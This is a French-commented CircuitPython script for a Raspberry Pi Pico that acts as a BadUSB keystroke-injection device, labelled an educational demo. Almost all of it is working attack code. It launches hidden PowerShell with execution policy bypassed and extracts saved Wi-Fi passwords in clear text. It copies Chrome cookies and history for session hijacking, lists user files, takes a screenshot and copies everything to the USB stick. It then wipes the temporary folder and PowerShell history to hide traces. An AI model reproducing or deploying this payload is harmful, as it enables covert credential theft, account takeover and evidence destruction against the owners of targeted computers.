"""
Raspberry Pi Pico - BadUSB Demo 4: Exfiltration Furtive
========================================================

AVERTISSEMENT LÉGAL:
Ce script est fourni à des fins éducatives et de sensibilisation uniquement.

Description:
Exfiltration INVISIBLE avec PowerShell caché
Compatible clavier AZERTY français

Durée: ~8 secondes
Impact: CRITIQUE - Vol de données sans détection

Ce script démontre:
- Exécution complètement invisible (PowerShell caché)
- Vol de cookies Chrome (session hijacking)
- Vol de mots de passe WiFi
- Capture d'écran
- Exfiltration rapide et furtive

Données collectées:
- Mots de passe WiFi en clair
- Cookies Chrome (sessions actives)
- Historique de navigation
- Liste des fichiers Documents/Desktop/Downloads
- Informations système et réseau
- Capture d'écran

Exfiltration:
- CIRCUITPY/exfil/ (fichiers individuels)
- CIRCUITPY/exfil/data_YYYYMMDD_HHMMSS.zip
"""

# ============================================================================
# IMPORTS
# ============================================================================
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from keycode_win_fr import Keycode

# ============================================================================
# INITIALISATION
# ============================================================================
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

def press_combo(*keys):
    """Appuie sur une combinaison de touches"""
    keyboard.press(*keys)
    time.sleep(0.1)
    keyboard.release_all()
    time.sleep(0.1)

def press_enter():
    """Appuie sur Entrée"""
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.3)

# ============================================================================
# SCRIPT PRINCIPAL
# ============================================================================

# Attendre la reconnaissance du périphérique
time.sleep(2)

# Étape 1: Ouvrir PowerShell INVISIBLE
# -W Hidden: Fenêtre cachée
# -NoP: Pas de profil
# -NonI: Non interactif
# -Exec Bypass: Contourner la politique d'exécution
press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
layout.write("powershell -W Hidden -NoP -NonI -Exec Bypass")
press_enter()
time.sleep(1.5)

# Étape 2: Commandes d'exfiltration furtive
commands = [
    # Créer dossier temporaire avec nom aléatoire
    "$d=$env:TEMP+'\\'+[System.IO.Path]::GetRandomFileName().Split('.')[0];",
    "mkdir $d|Out-Null;",
    
    # Extraire mots de passe WiFi (CRITIQUE)
    "(netsh wlan show profiles)|sls '\\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();(netsh wlan show profile name=$n key=clear)}|Out-File $d\\w.txt;",
    
    # Voler cookies Chrome (SESSION HIJACKING)
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies' $d\\c.db -EA SilentlyContinue};",
    
    # Voler historique Chrome
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History' $d\\h.db -EA SilentlyContinue};",
    
    # Lister fichiers utilisateur
    "gci $env:USERPROFILE\\Documents -R -EA SilentlyContinue|select FullName,LastWriteTime|Out-File $d\\docs.txt;",
    "gci $env:USERPROFILE\\Desktop -R -EA SilentlyContinue|select FullName,LastWriteTime|Out-File $d\\desk.txt;",
    "gci $env:USERPROFILE\\Downloads -R -EA SilentlyContinue|select FullName,LastWriteTime|Out-File $d\\dl.txt;",
    
    # Collecter infos système
    "Get-ComputerInfo|select CsName,OsName,CsDomain,CsUserName|Out-File $d\\sys.txt;",
    "Get-NetIPAddress|select IPAddress,InterfaceAlias|Out-File $d\\net.txt;",
    
    # Capture d'écran (PREUVE VISUELLE)
    "Add-Type -A System.Windows.Forms;",
    "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;",
    "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);",
    "$g=[System.Drawing.Graphics]::FromImage($b);",
    "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);",
    "$b.Save(\"$d\\screen.png\");",
    
    # Détecter le Pico
    "$usb=(gwmi win32_volume|?{$_.Label -eq 'CIRCUITPY' -or $_.Label -eq 'RPI-RP2'}).DriveLetter;",
    'if($usb){if(!(Test-Path "$usb\\exfil")){mkdir "$usb\\exfil" | Out-Null}};',
    
    # Exfiltrer vers le Pico (fichiers individuels)
    'if($usb){Copy-Item $d\\* "$usb\\exfil\\" -Recurse -Force -EA SilentlyContinue};',
    
    # Créer archive compressée
    'if($usb){Compress-Archive -Path $d\\* -DestinationPath "$usb\\exfil\\data_$(Get-Date -Format "yyyyMMdd_HHmmss").zip" -CompressionLevel Fastest -EA SilentlyContinue};',
    
    # Nettoyage des traces
    "Start-Sleep -Seconds 1;",
    "Remove-Item -Recurse -Force $d -EA SilentlyContinue;",
    "Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue;",
    "Clear-History;",
    "exit"
]

# Étape 3: Exécuter les commandes de manière invisible
for cmd in commands:
    layout.write(cmd)
    press_enter()
    time.sleep(0.15)  # Délai minimal pour maximiser la vitesse
